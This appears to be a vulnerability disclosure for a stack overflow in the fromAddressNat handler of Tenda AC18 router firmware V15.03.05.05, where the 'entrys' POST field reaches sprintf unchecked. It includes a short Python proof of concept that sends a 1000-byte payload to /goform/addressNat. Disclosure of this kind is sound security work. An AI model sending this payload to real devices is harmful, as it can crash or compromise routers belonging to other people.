## Overview

- The device's official website: https://www.tenda.com.cn/product/overview/AC18.html

- Firmware download website: https://www.tenda.com.cn/download/detail-2610.html

## Affected version

V15.03.05.05

## Vulnerability details

The Tenda AC18 V15.03.05.05 firmware has a stack overflow vulnerability in the `fromAddressNat` function. The `v9` variable receives the `entrys` parameter from a POST request. The value is directly used in a `sprintf` function and passes to a local variable on the stack, which can override the return address of the function. The user-provided `entrys` can trigger this security vulnerability.

![image-20240305210536503](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240305210536503.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/addressNat"
payload = b"a"*1000

data = {"entrys": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240305210435303](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240305210435303.png)
